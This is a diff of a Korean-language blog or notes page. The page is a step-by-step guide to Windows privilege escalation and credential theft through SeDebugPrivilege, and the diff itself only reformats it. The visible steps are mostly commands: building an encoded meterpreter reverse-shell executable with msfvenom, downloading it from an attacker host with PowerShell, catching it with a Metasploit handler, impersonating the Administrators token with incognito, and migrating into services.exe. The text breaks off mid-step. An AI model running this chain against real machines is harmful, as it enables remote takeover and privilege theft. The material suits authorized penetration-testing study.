@@ -1,3 +1,14 @@
+---
+layout: page
+title: SeDebugPrivilege
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # SeDebugPrivilege를 이용한 권한 상승 및 자격 증명 탈취 가이드
@@ -122,7 +133,7 @@ token::elevate
 #### **1단계: Reverse Shell 생성**
 - msfvenom 사용해서 생성
 
-```bash title="공격자 Kali"
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
 ```
 
@@ -138,7 +149,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://<kali-ip>:800
 #### **3단계: msf에서 Reverse Shell 대기**
 - msf 셋팅
 
-```bash title=" handler is set up in Metasploit"
+```bash
 msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -151,7 +162,7 @@ run
 #### **4단계: Target 서버에서 Reverse Shell 실행
 - Reverse Shell 실행
 
-```powershell title="Target"
+```powershell
 Start-Process "shell-name.exe"
 ```
 
@@ -160,19 +171,19 @@ Start-Process "shell-name.exe"
 - msf 내 Incognito 로드 시킴.
 - Incognito 모듈 : 이 모듈은 성공적으로 시스템을 침투한 후, Windows의 사용자 토큰(access token)을 캡처하고 이를 이용해 다른 사용자로 가장(impersonate)할 수 있게 해줍니다. 토큰은 Windows의 인증 메커니즘으로, 이를 훔치면 비밀번호 없이도 다른 계정의 권한을 사용할 수 있습니다.
 
-```bash title="meterpreter"
+```bash
 load incognito
 list_tokens -g
 ```
 
-![[Pasted image 20250820233342.png]]
+![Pasted_image_20250820233342.png](/image/Pasted_image_20250820233342.png)
 
 
 #### **6단계: 토큰 사칭**
 - Administrators 의 토큰을 사칭
 - 높은 권한 토큰이 있더라도 권한 있는 사용자의 권한이 없을 수 있습니다(이는 Windows에서 권한을 처리하는 방식 때문입니다. 가장된 토큰이 아닌 프로세스의 기본 토큰을 사용하여 프로세스가 수행할 수 있는 작업 또는 수행할 수 없는 작업을 결정합니다).
 
-```bash title="meterpreter"
+```bash
 impersonate_token "BUILTIN\Administrators"
 ```
 
@@ -181,7 +192,7 @@ impersonate_token "BUILTIN\Administrators"
 #### **7단계: 프로세스 마이그레이션**
 - 올바른 권한이 있는 프로세스로 마이그레이션해야 합니다. 가장 안전한 프로세스는 services.exe 프로세스입니다. 먼저 _ps_ 명령을 사용하여 프로세스를 보고 services.exe 프로세스의 PID를 찾습니다. _migrate PID-OF-PROCESS_ 명령을 사용하여 이 프로세스로 마이그레이션합니다.
 
-```bash title="meterpreter"
+```bash
 # 프로세스 목록에서 services.exe PID 확인 (668)
 ps 
 
